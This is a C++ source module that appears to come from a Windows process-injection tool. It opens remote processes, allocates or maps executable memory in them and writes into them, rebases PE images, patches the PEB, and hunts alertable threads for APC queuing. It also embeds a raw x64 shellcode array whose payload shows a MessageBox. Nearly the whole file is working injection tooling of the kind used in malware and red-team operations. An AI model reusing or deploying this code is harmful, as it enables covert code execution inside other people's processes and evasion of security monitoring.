#include <cstdint>
#include <cassert>

#include "phnt_windows.h"

#include "common.h"
#include "sysapi.h"
#include "fs.h"
#include "pdb.h"
#include "logging.h"
#include "modules.h"

#include "kernel_dump.h"

namespace modules {

const char *decode(RemoteProcessMemoryMethod method) {
    switch (method) {
    case RemoteProcessMemoryMethod::AllocateInAddr:
        return "allocate memory in remote process, work with VAs via virtual memory routines";
    case RemoteProcessMemoryMethod::CreateSectionMap:
        return "create new section, map view for remote process, work with VAs via virtual memory routines";
    case RemoteProcessMemoryMethod::CreateSectionMapLocalMap:
        return "create new section, map view for remote and local processes, work with local VAs directly";
    case RemoteProcessMemoryMethod::LiveDumpParse:
        return "create system live dump, parse process memory";
    default:
        assert(false);
        return nullptr;
    }
}

const char *decode(RemoteProcessOpenMethod method) {
    switch (method) {
    case RemoteProcessOpenMethod::OpenProcess:
        return "open process using NtOpenProcess()";
    case RemoteProcessOpenMethod::OpenProcessByHwnd:
        return "find any window and find window open process using NtUserGetWindowProcessHandle()";
    default:
        assert(false);
        return nullptr;
    }
}

// MessageBox
char default_shellcode[] =
    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
    "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
    "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
    "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
    "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
    "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
    "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
    "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
    "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
    "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
    "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
    "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
    "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
    "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
    "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
    "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
    "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
    "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
    "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
    "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
    "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
    "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
    "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
    "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
    "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
    "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
    "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
    "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
    "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

char *default_shellcode_data = default_shellcode;
size_t default_shellcode_size = sizeof(default_shellcode);

//

struct EnumWindowsProcOpts {
    DWORD pid; // in
    HWND hWnd; // out
};

BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {

    DWORD pid = 0;
    GetWindowThreadProcessId(hWnd, &pid);

    auto *opts = (EnumWindowsProcOpts *)lParam;
    if (pid == opts->pid) {
        opts->hWnd = hWnd;
        return FALSE;
    }

    return TRUE;
}

HANDLE process_open(RemoteProcessOpenMethod method, uint32_t pid, ACCESS_MASK AccessMask) {

    switch (method) {
    case RemoteProcessOpenMethod::OpenProcess:
        return sysapi::ProcessOpen(pid, AccessMask);
    case RemoteProcessOpenMethod::OpenProcessByHwnd: {

        EnumWindowsProcOpts opts = {};
        opts.pid = pid;

        EnumWindows(EnumWindowsProc, (LPARAM)&opts);
        if (opts.hWnd == NULL) {
            bblog::error("unable to find any windows for the process");
            return NULL;
        }

        bblog::debug("window found, HWND = 0x{:x}", (uintptr_t)opts.hWnd);
        // return sysapi::ProcessOpenByHwnd(opts.hWnd, AccessMask); // TODO: research access restrictions
        return sysapi::ProcessOpenByHwnd(opts.hWnd, PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE);
    }
    default:
        assert(false);
        return NULL;
    }
}

//

bool process_init_memory(RemoteProcessMemoryContext& ctx, RemoteProcessMemoryMethod method, HANDLE ProcessHandle, uint32_t pid) {

    switch (method) {
    case RemoteProcessMemoryMethod::AllocateInAddr:
    case RemoteProcessMemoryMethod::CreateSectionMap:
    case RemoteProcessMemoryMethod::CreateSectionMapLocalMap:

        assert(ProcessHandle);
        ctx.method = method;
        ctx.ProcessHandle = ProcessHandle;
        return true;

    case RemoteProcessMemoryMethod::LiveDumpParse: {

        assert(pid);

        auto res = system_init_live_dump(ctx.kernel_dump_ctx);
        if (!res) {
            return false;
        }

        auto processes = kernel_dump::get_processes(ctx.kernel_dump_ctx);
        for (const auto& p : processes) {
            if (p.pid == pid) {
                ctx.kernel_dump_process = p;
                break;
            }
        }

        if (ctx.kernel_dump_process.pid == 0) {
            bblog::error("unable to find process in system live dump, PID = {}", pid);
            return false;
        }

        ctx.method = method;
        return true;
    }

    default:
        assert(false);
        return false;
    }
}

bool process_create_memory(RemoteProcessMemoryContext& ctx) {

    assert(ctx.Size != 0);

    switch (ctx.method) {
    case RemoteProcessMemoryMethod::AllocateInAddr:

        bblog::info("allocating memory ({} bytes)...", ctx.Size);

        ctx.RemoteBaseAddress = sysapi::VirtualMemoryAllocate(ctx.Size, PAGE_EXECUTE_READWRITE, ctx.ProcessHandle, ctx.RemoteBaseAddress);
        if (ctx.RemoteBaseAddress == nullptr) {
            return false;
        }

        return true;

    case RemoteProcessMemoryMethod::CreateSectionMap:
    case RemoteProcessMemoryMethod::CreateSectionMapLocalMap:

        bblog::info("creating section ({} bytes)...", ctx.Size);

        ctx.Section = sysapi::SectionCreate(ctx.Size);
        if (ctx.Section == NULL) {
            return false;
        }

        bblog::info("mapping section for process (HANDLE = 0x{:x})...", (uintptr_t)ctx.ProcessHandle);

        ctx.RemoteBaseAddress = sysapi::SectionMapView(ctx.Section, ctx.Size, PAGE_EXECUTE_READWRITE, ctx.ProcessHandle, ctx.RemoteBaseAddress);
        if (ctx.RemoteBaseAddress == nullptr) {
            return false;
        }

        if (ctx.method == RemoteProcessMemoryMethod::CreateSectionMapLocalMap) {

            bblog::info("mapping section for current process...");

            ctx.LocalBaseAddress = sysapi::SectionMapView(ctx.Section, ctx.Size, PAGE_READWRITE);
            if (ctx.LocalBaseAddress == nullptr) {
                return false;
            }
        }

        return true;

    case RemoteProcessMemoryMethod::LiveDumpParse:
        bblog::error("live system dump is RO method");
        assert(false);
        return false;

    default:
        assert(false);
        return false;
    }
}

bool process_read_memory(const RemoteProcessMemoryContext& ctx, size_t offset, PVOID Data, SIZE_T Size) {

    assert(Size != 0);

    bool res;

    if (ctx.method == RemoteProcessMemoryMethod::LiveDumpParse) {
        res = kernel_dump::read_data(ctx.kernel_dump_ctx.parser, (uint64_t)PTR_ADD(ctx.RemoteBaseAddress, offset), Data, Size, ctx.kernel_dump_process.dtb);
    }
    else if (ctx.LocalBaseAddress == nullptr) {
        res = sysapi::VirtualMemoryRead(Data, Size, PTR_ADD(ctx.RemoteBaseAddress, offset), ctx.ProcessHandle);
    }
    else {
        memcpy(Data, PTR_ADD(ctx.LocalBaseAddress, offset), Size);
        res = true;
    }

    return res;
}

bool process_write_memory(const RemoteProcessMemoryContext& ctx, size_t offset, PVOID Data, SIZE_T Size) {

    assert(Size != 0);

    if (ctx.method == RemoteProcessMemoryMethod::LiveDumpParse) {
        bblog::error("live system dump is RO method");
        assert(false);
        return false;
    }

    bool res;

    if (ctx.LocalBaseAddress == nullptr) {
        res = sysapi::VirtualMemoryWrite(Data, Size, PTR_ADD(ctx.RemoteBaseAddress, offset), ctx.ProcessHandle);
    }
    else {
        memcpy(PTR_ADD(ctx.LocalBaseAddress, offset), Data, Size);
        res = true;
    }

    return res;
}

bool process_memory_create_write(RemoteProcessMemoryContext& ctx, PVOID Data, SIZE_T Size) {

    bool res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    res = process_write_memory(ctx, 0, Data, Size);
    if (!res) {
        return false;
    }

    return true;
}

bool process_memory_create_write_fixup_addr(RemoteProcessMemoryContext& ctx, PVOID Data, SIZE_T Size, RemoteProcessMemoryContext& ctx_fixup, size_t offset_fixup) {

    bool res = process_memory_create_write(ctx, Data, Size);
    if (!res) {
        return false;
    }

    res = process_write_memory(ctx_fixup, offset_fixup, &ctx.RemoteBaseAddress, sizeof(ctx.RemoteBaseAddress));
    if (!res) {
        return false;
    }

    return true;
}

bool process_pe_image_relocate(const RemoteProcessMemoryContext& ctx, PVOID ImageBuffer) {

    auto *pDOSHeader = (PIMAGE_DOS_HEADER)ImageBuffer;

    auto *pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(ImageBuffer, pDOSHeader->e_lfanew);
    auto *pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;

    bool is_64 = pNT32Header->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;

    size_t ImageBaseOffset = pDOSHeader->e_lfanew + is_64 ?
                                 offsetof(IMAGE_NT_HEADERS64, OptionalHeader.ImageBase) :
                                 offsetof(IMAGE_NT_HEADERS32, OptionalHeader.ImageBase);

    bblog::info("writing new image base at 0x{:x}...", (uintptr_t)ctx.RemoteBaseAddress);

    bool res;
    if (is_64) {
        auto ImageBaseAddress = (UINT64)(UINT_PTR)ctx.RemoteBaseAddress;
        res = process_write_memory(ctx, ImageBaseOffset, &ImageBaseAddress, sizeof(ImageBaseAddress));
    }
    else {
        auto ImageBaseAddress = (UINT32)(UINT_PTR)ctx.RemoteBaseAddress;
        res = process_write_memory(ctx, ImageBaseOffset, &ImageBaseAddress, sizeof(ImageBaseAddress));
    }

    if (!res) {
        return false;
    }

    ptrdiff_t delta = PTR_DIFF(ctx.RemoteBaseAddress, is_64 ? pNT64Header->OptionalHeader.ImageBase : pNT32Header->OptionalHeader.ImageBase);
    if (delta == 0) {
        bblog::info("image base is already at the base address = 0x{:x}", (uintptr_t)ctx.RemoteBaseAddress);
        return true;
    }

    bblog::info("rebasing relocation entries...");

    auto *pSection = (PIMAGE_SECTION_HEADER)PTR_ADD(ImageBuffer, pDOSHeader->e_lfanew + (is_64 ? sizeof(IMAGE_NT_HEADERS64) : sizeof(IMAGE_NT_HEADERS32)));

    DWORD RelocAddr = 0;

    for (WORD i = 0; i < pNT32Header->FileHeader.NumberOfSections; i++) {
        if (strcmp((char *)pSection[i].Name, ".reloc") == 0) {
            pSection = &pSection[i];
            RelocAddr = pSection->PointerToRawData;
            break;
        }
    }

    if (RelocAddr == 0) {
        bblog::error("unable to find \".reloc\" section...");
        return false;
    }

    IMAGE_DATA_DIRECTORY relocData =
        is_64 ? pNT64Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] :
                pNT32Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    for (DWORD dwOffset = 0; dwOffset < relocData.Size;) {

        auto *pBlockheader = (PBASE_RELOCATION_BLOCK)PTR_ADD(ImageBuffer, RelocAddr + dwOffset);
        dwOffset += sizeof(BASE_RELOCATION_BLOCK);

        DWORD dwEntryCount = (pBlockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

        auto *pBlocks = (PBASE_RELOCATION_ENTRY)PTR_ADD(ImageBuffer, RelocAddr + dwOffset);

        for (DWORD j = 0; j < dwEntryCount; j++) {

            dwOffset += sizeof(BASE_RELOCATION_ENTRY);

            if (pBlocks[j].Type == 0) {
                continue;
            }

            DWORD FieldAddress = pBlockheader->PageAddress + pBlocks[j].Offset;

            if (is_64) {
                DWORD64 Field = 0;
                res = process_read_memory(ctx, FieldAddress, &Field, sizeof(Field));
                if (!res) {
                    return false;
                }

                Field += (DWORD64)delta;

                res = process_write_memory(ctx, FieldAddress, &Field, sizeof(Field));
                if (!res) {
                    return false;
                }
            }
            else {
                DWORD32 Field = 0;
                res = process_read_memory(ctx, FieldAddress, &Field, sizeof(Field));
                if (!res) {
                    return false;
                }

                Field += (DWORD32)delta;

                res = process_write_memory(ctx, FieldAddress, &Field, sizeof(Field));
                if (!res) {
                    return false;
                }
            }
        }
    }

    return true;
}

//

bool process_write_params(HANDLE ProcessHandle, PRTL_USER_PROCESS_PARAMETERS Params, PVOID PebBaseAddress, RemoteProcessMemoryMethod method) {

    RemoteProcessMemoryContext ctx_params;
    ctx_params.method = method;
    ctx_params.ProcessHandle = ProcessHandle;
    ctx_params.Size = Params->Length;

    RemoteProcessMemoryContext ctx_peb;
    ctx_peb.ProcessHandle = ProcessHandle;
    ctx_peb.RemoteBaseAddress = PebBaseAddress;
    // TODO: add another methods

    bool res = process_memory_create_write_fixup_addr(ctx_params, Params, Params->Length, ctx_peb, offsetof(PEB, ProcessParameters));
    if (!res) {
        return false;
    }

    if (Params->Environment) {

        RemoteProcessMemoryContext ctx_env;
        ctx_env.method = method;
        ctx_env.ProcessHandle = ProcessHandle;
        ctx_env.Size = (ULONG)Params->EnvironmentSize;

        res = process_memory_create_write_fixup_addr(ctx_env, Params->Environment, Params->EnvironmentSize, ctx_params, offsetof(RTL_USER_PROCESS_PARAMETERS, Environment));
        if (!res) {
            return false;
        }
    }

    return true;
}

unique_c_mem<PEB> process_read_peb(HANDLE ProcessHandle) {

    bblog::info("getting process PEB address...");

    PROCESS_BASIC_INFORMATION BasicInfo;
    auto res = sysapi::ProcessGetBasicInfo(ProcessHandle, BasicInfo);
    if (!res) {
        return {};
    }

    unique_c_mem<PEB> process_peb;
    if (!process_peb.allocate()) {
        return {};
    }

    bblog::info("reading process PEB at 0x{:x}...", (uintptr_t)BasicInfo.PebBaseAddress);

    size_t read = sysapi::VirtualMemoryRead(process_peb.data(), sizeof(PEB), BasicInfo.PebBaseAddress, ProcessHandle);
    if (read == 0) {
        return {};
    }

    return process_peb;
}

sysapi::unique_handle process_open_alertable_thread(HANDLE ProcessHandle) {

    sysapi::unique_handle ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle);
    if (ThreadHandle == NULL) {
        return NULL;
    }

    do {
        sysapi::unique_handle hLocalEvent = sysapi::EventCreate();
        if (hLocalEvent == NULL) {
            return NULL;
        }

        // NOTE: never close remote handle
        HANDLE hRemoteEvent = sysapi::HandleDuplicate(ProcessHandle, hLocalEvent.get());
        if (hRemoteEvent == NULL) {
            ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle, ThreadHandle.get());
            continue;
        }

        auto res = sysapi::ThreadSuspend(ThreadHandle.get());
        if (!res) {
            ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle, ThreadHandle.get());
            continue;
        }

        res = sysapi::ThreadQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)NtSetEvent, hRemoteEvent);
        if (!res) {
            ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle, ThreadHandle.get());
            continue;
        }

        res = sysapi::ThreadResume(ThreadHandle.get());
        if (!res) {
            ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle, ThreadHandle.get());
            continue;
        }

        LARGE_INTEGER Timeout{ .QuadPart = -10000000 }; // 1 second

        NTSTATUS status = NtWaitForSingleObject(hLocalEvent.get(), FALSE, &Timeout);
        if (!NT_SUCCESS(status)) {
            bblog::error("unable to wait for event, {}", str::decode_ntstatus(status));
            ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle, ThreadHandle.get());
            continue;
        }

        if (status == STATUS_TIMEOUT) {
            bblog::debug("probably not an alertable thread (HANDLE = 0x{:x})", (uintptr_t)ThreadHandle.get());
            ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle, ThreadHandle.get());
            continue;
        }

        bblog::debug("alertable thread found, HANDLE = 0x{:x}", (uintptr_t)ThreadHandle.get());
        return ThreadHandle;

    } while (ThreadHandle != NULL);

    bblog::error("unable to find alertable thread, process (HANDLE = 0x{:x})", (uintptr_t)ProcessHandle);
    return NULL;
}

//

bool system_init_live_dump(kernel_dump::kernel_dump_context_t& ctx) {

    auto uCurrentDirectory = sysapi::GetPeb()->ProcessParameters->CurrentDirectory.DosPath;

    std::wstring TempPath = {
        uCurrentDirectory.Buffer,
        uCurrentDirectory.Length / sizeof(wchar_t)
    };

    auto DumpPath = TempPath + L"system.dmp";

    //

    {
        sysapi::unique_handle DumpPathHandle = sysapi::FileCreate(DumpPath.c_str(), FILE_GENERIC_WRITE, FILE_SHARE_WRITE, 0);
        if (DumpPathHandle == nullptr) {
            return false;
        }

        if (!sysapi::DumpLiveSystem(DumpPathHandle.get())) {
            return false;
        }
    }

    //

    auto kernel_image = fs::map_file(L"c:\\windows\\system32\\ntoskrnl.exe");
    if (kernel_image.data == NULL) {
        return false;
    }

    auto kernel_pdb_path = pdb::download_pdb(TempPath, kernel_image.data, true);
    if (kernel_pdb_path.empty()) {
        return false;
    }

    //

    if (!kernel_dump::init_parser(str::to_string(DumpPath).c_str(), kernel_pdb_path.c_str(), ctx)) {
        return false;
    }

    return true;
}

} // namespace modules
